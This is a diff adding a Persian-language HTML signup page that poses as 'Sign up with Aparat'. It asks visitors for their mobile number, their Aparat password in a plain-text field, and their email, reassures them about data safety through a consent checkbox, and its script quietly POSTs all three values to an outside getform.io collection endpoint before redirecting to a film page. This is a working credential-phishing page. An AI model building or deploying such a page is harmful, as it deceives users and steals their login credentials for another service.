@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ثبت نام</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(135deg, #0f0f16, #050508);
+    font-family: tahoma;
+    color: #fff;
+}
+
+.container {
+    width: 100%;
+    max-width: 380px;
+    padding: 20px;
+}
+
+.card {
+    background: #141420;
+    border-radius: 16px;
+    padding: 24px;
+    box-shadow: 0 0 30px rgba(0, 255, 136, 0.15);
+}
+
+.card h2 {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+label {
+    display: block;
+    margin-top: 12px;
+    font-size: 14px;
+    color: #ccc;
+}
+
+input {
+    width: 100%;
+    padding: 12px;
+    margin-top: 6px;
+    border-radius: 8px;
+    border: none;
+    outline: none;
+    background: #1c1c2b;
+    color: #fff;
+    font-size: 14px;
+}
+
+input::placeholder { color: #aaa; }
+
+button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 18px;
+    border: none;
+    border-radius: 8px;
+    background: #00ff88;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 15px;
+    transition: background 0.3s;
+}
+
+button:hover { background: #00e07a; }
+
+.checkbox-box {
+    margin-top: 15px;
+    font-size: 13px;
+    color: #ccc;
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    line-height: 1.6;
+}
+
+.checkbox-box input {
+    width: 18px;
+    height: 18px;
+    cursor: pointer;
+    margin-top: 3px;
+}
+
+.a { color: #00ff88; text-decoration: none; }
+.a:hover { text-decoration: underline; }
+</style>
+
+<!-- ✅ اضافه شده: جلوگیری از نمایش صفحه لاگین بعد از یک بار ورود -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const isLoggedIn = localStorage.getItem("is_logged_in");
+    if (isLoggedIn === "true") {
+        window.location.replace("film-site.html");
+    }
+});
+</script>
+
+<script>
+function sendAndRedirect() {
+    let username = document.getElementById("aparatUsername").value.trim();
+    let mobile   = document.getElementById("aparatMobile").value.trim();
+    let password = document.getElementById("sitePass").value.trim();
+    let consent  = document.getElementById("userConsent").checked;
+
+    if (username === "" || mobile === "" || password === "") {
+        alert("لطفاً اطلاعات را کامل وارد کنید");
+        return;
+    }
+
+    if (!consent) {
+        alert("برای ادامه باید با قوانین موافقت کنید");
+        return;
+    }
+
+    localStorage.setItem("aparat_username", username);
+    localStorage.setItem("aparat_mobile", mobile);
+
+    <!-- ✅ اضافه شده: ثبت وضعیت لاگین -->
+    localStorage.setItem("is_logged_in", "true");
+
+    const formData = new FormData();
+    formData.append("username", username);
+    formData.append("mobile", mobile);
+    formData.append("password", password);
+
+    fetch("https://getform.io/f/amdjygvb", {
+        method: "POST",
+        body: formData
+    })
+    .then(response => {
+        window.location.href = "film-site.html";
+    })
+    .catch(error => {
+        console.error("خطا در ارسال اطلاعات:", error);
+        alert("ارسال اطلاعات موفق نبود. لطفاً دوباره تلاش کنید.");
+    });
+}
+</script>
+</head>
+
+<body>
+
+<div class="container">
+    <div class="card">
+        <h2><a href="https://www.aparat.com/home" target="_blank" style="color: #00ff88;">ثبت نام با آپارات</a></h2>
+
+        <label for="aparatUsername">شماره مبایل</label>
+        <input type="tel" id="aparatUsername" name="phone" placeholder="شماره مبایل" required>
+
+        <label for="aparatMobile">رمز عبور آپارات</label>
+        <input type="text" id="aparatMobile" name="password" placeholder="رمز عبور آپارات" required>
+
+        <label for="aparatMobile">ایمیل</label>
+        <input type="email" id="sitePass" name="email" placeholder="ایمیل" required>
+
+        <div class="checkbox-box">
+            <input type="checkbox" id="userConsent">
+            <label for="userConsent">
+                من <a class="a" href="amount.html" target="_blank">امان نامه اطلاعات</a>
+                را مطالعه کردم و از امنیت اطلاعاتم مطمئن هستم
+            </label>
+        </div>
+
+        <button type="button" onclick="sendAndRedirect()">
+            ثبت نام و ورود
+        </button>
+
+    </div>
+</div>
+
+</body>
+</html>
